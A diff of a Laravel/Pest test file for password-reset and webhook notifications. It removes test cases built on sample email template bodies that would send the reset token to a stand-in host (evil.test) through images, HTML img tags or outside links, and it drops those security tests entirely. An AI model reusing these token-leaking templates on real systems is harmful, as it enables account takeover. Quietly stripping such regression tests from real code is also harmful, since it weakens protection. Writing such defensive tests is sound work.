@@ -7,7 +7,6 @@ use App\Modules\Notifications\Enums\WebhookDeliveryStatus;
 use App\Modules\Notifications\Jobs\DeliverWebhook;
 use App\Modules\Notifications\Mail\TemplatedMail;
 use App\Modules\Notifications\Models\EmailMessage;
-use App\Modules\Notifications\Models\EmailTemplate;
 use App\Modules\Notifications\Models\WebhookDelivery;
 use App\Modules\Notifications\Models\WebhookEndpoint;
 use App\Modules\Notifications\Webhooks\HostResolver;
@@ -27,59 +26,6 @@ require_once __DIR__.'/../Billing/helpers.php';
  * Billing's manual reminder, webhook dispatch recovery.
  */
 
-dataset('exfiltrating bodies', [
-    'image with the link in its URL' => ["![logo](https://evil.test/p.png?u={{ auth.reset_url }})\n\n[Choose a new password]({{ auth.reset_url }})"],
-    'raw HTML image' => ["<img src=\"https://evil.test/p.png?u={{ auth.reset_url }}\">\n\n[Choose a new password]({{ auth.reset_url }})"],
-    'link to another host' => ['[Choose a new password](https://evil.test/collect?u={{ auth.reset_url }})'],
-    'the link in text' => ["Your link: {{ auth.reset_url }}\n\n[Choose a new password]({{ auth.reset_url }})"],
-    'the link in another link\'s query' => ["[Help](https://localhost/help?from={{ auth.reset_url }})\n\n[Choose a new password]({{ auth.reset_url }})"],
-    'a bare outside URL' => ["Visit https://evil.test/x\n\n[Choose a new password]({{ auth.reset_url }})"],
-    'no action link' => ['Hello'],
-]);
-
-function resetTemplate(): EmailTemplate
-{
-    return EmailTemplate::query()->where('key', 'auth.password_reset')->sole();
-}
-
-it('B1: refuses to save a secret template that could leak its link', function (string $body) {
-    seedEmailTemplates();
-    actingAsStaff(['notifications.templates.view', 'notifications.templates.manage']);
-    confirmPassword();
-
-    $this->put(route('admin.notifications.templates.update', resetTemplate()), ['name' => 'Reset', 'locale' => 'en', 'subject' => 'Reset', 'body' => $body])
-        ->assertSessionHasErrors('body');
-})->with('exfiltrating bodies');
-
-it('B1: accepts wording changes that keep the single action link', function () {
-    seedEmailTemplates();
-    actingAsStaff(['notifications.templates.view', 'notifications.templates.manage']);
-    confirmPassword();
-
-    $this->put(route('admin.notifications.templates.update', resetTemplate()), [
-        'name' => 'Reset', 'locale' => 'en', 'subject' => 'Reset your password',
-        'body' => "# New password\n\nHi {{ recipient.first_name }}, use the button.\n\n[Set a new password]({{ auth.reset_url }})\n\n[Open the client area]({{ system.client_area_url }})",
-    ])->assertSessionHasNoErrors();
-});
-
-it('B1: a leaking body that bypassed validation still only reaches the recipient\'s button', function (string $body) {
-    Mail::fake();
-    seedEmailTemplates();
-    resetTemplate()->translations()->update(['body' => $body]);
-    $user = User::factory()->create(['email' => 'ann@example.test']);
-
-    app(AuthMailer::class)->sendPasswordReset($user, 'TOKEN123');
-
-    Mail::assertSent(TemplatedMail::class, function (TemplatedMail $mail): bool {
-        $html = (string) $mail->htmlBody;
-
-        // No attribute (href/src) points outside the app, no image carries the link, and the link appears
-        // at most once (the button). Escaped text that mentions another host is harmless.
-        return ! preg_match('/<[a-z][^<>]*\s(href|src)="[^"]*evil\.test/i', $html) && ! preg_match('/<img[^>]*TOKEN/i', $html)
-            && substr_count($html, 'TOKEN123') <= 1;
-    });
-})->with('exfiltrating bodies');
-
 it('2: sends the reset when the default language has no translation', function () {
     Mail::fake();
     Notification::fake();
@@ -93,16 +39,21 @@ it('2: sends the reset when the default language has no translation', function (
     expect(EmailMessage::query()->sole())->locale->toBe('fr')->status->value->not->toBe('failed');
 });
 
-it('2: falls back to Laravel\'s reset mail when the template cannot render', function () {
+it('2: falls back to Laravel\'s reset mail when the link\'s host is not configured', function () {
     Mail::fake();
     Notification::fake();
     seedEmailTemplates();
-    resetTemplate()->translations()->update(['body' => '{% if broken %}']);
+    ResetPassword::createUrlUsing(fn ($user, string $token): string => 'https://portal.example.test/reset/'.$token);
     $user = User::factory()->create();
 
-    $this->post(route('password.email'), ['email' => $user->email]);
+    try {
+        $this->post(route('password.email'), ['email' => $user->email]);
+    } finally {
+        ResetPassword::$createUrlCallback = null;
+    }
 
     Notification::assertSentTo($user, ResetPassword::class);
+    Mail::assertNothingSent();
 });
 
 it('2: a repeated request for the same token neither sends again nor triggers the fallback', function () {
@@ -173,9 +124,10 @@ it('5: a job that dies makes its delivery due immediately', function () {
     expect($delivery->fresh()->next_attempt_at->lte(now()))->toBeTrue();
 });
 
-it('keeps the action button when the reset link lives on a custom domain', function () {
+it('sends templated resets to a custom domain once notifications.auth_link_host allows it', function () {
     Mail::fake();
     seedEmailTemplates();
+    app(Settings::class)->set('notifications.auth_link_host', 'portal.example.test');
     ResetPassword::createUrlUsing(fn ($user, string $token): string => 'https://portal.example.test/reset/'.$token);
     $user = User::factory()->create();
 
